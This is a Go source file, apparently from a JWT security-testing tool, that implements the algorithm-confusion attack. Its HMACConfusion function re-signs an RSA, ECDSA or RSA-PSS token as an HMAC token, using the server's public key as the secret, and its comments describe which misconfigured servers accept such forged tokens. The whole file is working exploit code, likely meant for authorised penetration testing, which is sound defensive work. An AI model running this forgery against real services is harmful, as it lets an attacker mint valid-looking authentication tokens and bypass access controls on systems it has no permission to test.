package exploit

import (
	"fmt"

	"github.com/cerberauth/jwtop/jwt/editor"
	jwtlib "github.com/golang-jwt/jwt/v5"
)

// HMACConfusion re-signs an RSA, ECDSA, or RSA-PSS token as its HMAC
// equivalent, using the provided public key PEM bytes as the HMAC secret.
//
// This exploits servers that use the same key material for both asymmetric
// verification and HMAC, or that do not enforce the algorithm declared in the
// header — commonly triggered by passing the algorithm choice from the token
// header to the verification function instead of hard-coding it.
//
// Algorithm mapping (same bit-strength):
//
//	RS256 / ES256 / PS256 → HS256
//	RS384 / ES384 / PS384 → HS384
//	RS512 / ES512 / PS512 → HS512
//
// Returns an error when the original token does not use an asymmetric
// algorithm or when re-signing fails.
func HMACConfusion(tokenString string, publicKeyPEM []byte) (string, error) {
	te, err := editor.NewTokenEditor(tokenString)
	if err != nil {
		return "", fmt.Errorf("parsing token: %w", err)
	}

	hmacMethod, err := hmacEquivalent(te.GetToken().Method)
	if err != nil {
		return "", err
	}

	result, err := te.SignWithMethodAndKey(hmacMethod, publicKeyPEM)
	if err != nil {
		return "", fmt.Errorf("signing with HMAC confusion: %w", err)
	}
	return result, nil
}

// hmacEquivalent maps an asymmetric signing method to its HMAC counterpart
// with the same nominal bit-strength.
func hmacEquivalent(method jwtlib.SigningMethod) (*jwtlib.SigningMethodHMAC, error) {
	switch method.Alg() {
	case "RS256", "ES256", "PS256":
		return jwtlib.SigningMethodHS256, nil
	case "RS384", "ES384", "PS384":
		return jwtlib.SigningMethodHS384, nil
	case "RS512", "ES512", "PS512":
		return jwtlib.SigningMethodHS512, nil
	default:
		return nil, fmt.Errorf("HMAC confusion requires an RSA, ECDSA, or RSA-PSS token; got %q", method.Alg())
	}
}
